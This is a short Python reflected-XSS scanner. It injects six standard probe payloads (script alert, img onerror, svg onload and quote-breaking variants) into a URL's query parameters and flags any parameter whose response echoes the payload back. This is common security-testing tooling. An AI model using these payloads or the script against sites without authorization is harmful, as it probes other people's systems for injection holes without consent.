#!/usr/bin/env python3
"""
Quick XSS Scanner - Simplified version for fast testing
"""

import sys
import urllib.parse
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore

init(autoreset=True)

def quick_scan(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    print(f"\n{Fore.CYAN}[*] Quick XSS Scan: {url}{Fore.RESET}\n")
    
    payloads = [
        '<script>alert("XSS")</script>',
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
    ]
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    vulnerable = []
    
    for param in params:
        print(f"{Fore.YELLOW}[*] Testing parameter: {param}{Fore.RESET}")
        for payload in payloads:
            test_url = url.replace(f'{param}=', f'{param}={urllib.parse.quote(payload)}')
            try:
                r = requests.get(test_url, timeout=5)
                if payload in r.text:
                    print(f"{Fore.GREEN}[+] VULNERABLE! Param: {param}{Fore.RESET}")
                    print(f"{Fore.GREEN}[+] Payload: {payload}{Fore.RESET}")
                    vulnerable.append((param, payload))
                    break
            except:
                pass
    
    if not vulnerable:
        print(f"{Fore.RED}[-] No vulnerabilities found{Fore.RESET}")
    
    return vulnerable

if __name__ == '__main__':
    if len(sys.argv) > 1:
        quick_scan(sys.argv[1])
    else:
        print(f"{Fore.YELLOW}Usage: python quick_scan.py <url>{Fore.RESET}")
